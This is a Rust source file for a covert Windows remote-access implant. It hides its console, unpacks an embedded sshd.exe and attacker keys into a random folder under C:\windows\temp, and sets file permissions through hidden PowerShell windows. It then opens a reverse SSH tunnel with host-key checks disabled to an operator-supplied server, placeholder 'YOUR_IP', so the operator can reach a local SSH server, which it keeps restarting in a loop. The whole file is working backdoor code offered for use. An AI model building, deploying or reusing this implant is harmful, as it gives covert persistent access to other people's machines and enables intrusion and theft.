#![windows_subsystem = "windows"] // Hides the console window
use std::fs;
use clap::{Parser};
use rand::{distributions::Alphanumeric, Rng};
use rust_embed::RustEmbed;
use std::path::{Path};
use std::process::{Command, Stdio};
use std::os::windows::process::CommandExt;
use std::{thread, time::Duration};

const CREATE_NO_WINDOW: u32 = 0x08000000;

#[derive(RustEmbed)]
#[folder = "files/"] // Ensure this folder exists with your sshd.exe and keys!
struct Asset;

#[derive(Parser)]
#[clap(name="winssh", version="1.0")]
struct Cli {
    #[clap(short, long, default_value_t = 8022)] 
    port: u16,
    #[clap(short, long, default_value = "YOUR_IP")] // Hardcoded Server
    tunnel_server: String,
    #[clap(short, long, default_value_t = 22 )]      // Hardcoded Tunnel Port
    tunnel_port: u16,
    #[clap(short, long, default_value = "YOUR_USERNAME")] // Hardcoded User
    tunnel_user: String
}

fn main() {
    // Parse arguments (will use the hardcoded defaults above if none provided)
    let cli = Cli::parse();    
    let port = cli.port;
    let tunnel_server = cli.tunnel_server;
    let tunnel_port = cli.tunnel_port;
    let tunnel_user = cli.tunnel_user;

    // Generate a random 6-character string for the temp folder name
    let rs: String = rand::thread_rng()
        .sample_iter(&Alphanumeric)
        .take(6)
        .map(char::from)
        .collect();  
    
    let tmp = format!("C:\\windows\\temp\\{}", rs);
    fs::create_dir_all(&tmp).unwrap();

    // Get current username for the banner
    let username_cmd_output = Command::new("powershell")
        .arg("-c")
        .arg("Write-Host $env:USERDOMAIN\\$env:USERNAME;")
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .unwrap();
    let username = String::from_utf8(username_cmd_output.stdout).unwrap().trim().to_string();

    // Files to extract from the embedded binary
    let files = ["host_rsa.pub", "host_dsa.pub", "host_rsa", "host_dsa", "authorized_keys", "sshd.exe", "sshd.pid", "key_reverse"];
    
    for file_name in &files {
        if let Some(f) = Asset::get(file_name) {
            let path = Path::new(&tmp).join(file_name);
            fs::write(&path, f.data.as_ref()).unwrap();

            // Set strict permissions via PowerShell (Required by SSH)
            let pathstr = path.display();
            let acl_cmd = format!(
                "$FilePath = '{}'; \
                 $acl = Get-Acl $FilePath; \
                 $acl.SetAccessRuleProtection($true, $false); \
                 $identity = [System.Security.Principal.WindowsIdentity]::GetCurrent(); \
                 $username = $identity.Name; \
                 $acl.Access | Where-Object {{ $_.IdentityReference -ne $username }} | ForEach-Object {{ $acl.RemoveAccessRule($_) }}; \
                 $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule($username, 'FullControl', 'Allow'); \
                 $acl.AddAccessRule($accessRule); \
                 Set-Acl $FilePath $acl;", 
                pathstr
            );
            
            Command::new("powershell")
                .arg("-c")
                .arg(acl_cmd)
                .creation_flags(CREATE_NO_WINDOW)
                .status()
                .unwrap();
        }
    }

    let tmp_abs = Path::new(&tmp).canonicalize().unwrap().display().to_string();
    let tmp_as = &tmp_abs[4..]; // Clean the \\?\ prefix

    // Create the SSHD configuration
    let config = format!(
        "Port {}\n\
        Banner banner.txt\n\
        ListenAddress 127.0.0.1\n\
        HostKey \"{}\\host_rsa\"\n\
        HostKey \"{}\\host_dsa\"\n\
        PubkeyAuthentication yes\n\
        AuthorizedKeysFile \"{}\\authorized_keys\"\n\
        GatewayPorts yes\n\
        PidFile \"{}\\sshd.pid\"\n",
        port, tmp_as, tmp_as, tmp_as, tmp_as
    );

    fs::write(Path::new(&tmp).join("sshd_config"), config).unwrap();
    fs::write(Path::new(&tmp).join("banner.txt"), format!("{}\n", username)).unwrap();

    thread::sleep(Duration::from_millis(1000));

    // Start the Reverse Tunnel
    // This tells the Windows machine: "Connect to 10.0.0.35 and forward my local port 8022 to your port 8022"
    let rev_tunnel = format!(
        "ssh -N -o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL -i \"{}\\key_reverse\" -R {}:127.0.0.1:{} -p {} {}@{}", 
        tmp_as, port, port, tunnel_port, tunnel_user, tunnel_server
    );

    Command::new("powershell")
        .arg("-c")
        .arg(&rev_tunnel)
        .creation_flags(CREATE_NO_WINDOW)
        .spawn()
        .ok();

    // Start the local SSH server loop
    let sshd_cmd = format!(".\\sshd.exe -f \"{}\\sshd_config\" -E \"{}\\log.txt\" -d", tmp_as, tmp_as);
    
    loop {
        Command::new("powershell")
            .arg("-c")
            .arg(format!("cd \"{}\"; {}", tmp_as, sshd_cmd))
            .creation_flags(CREATE_NO_WINDOW)
            .status()
            .unwrap();
        thread::sleep(Duration::from_secs(2));
    }
}
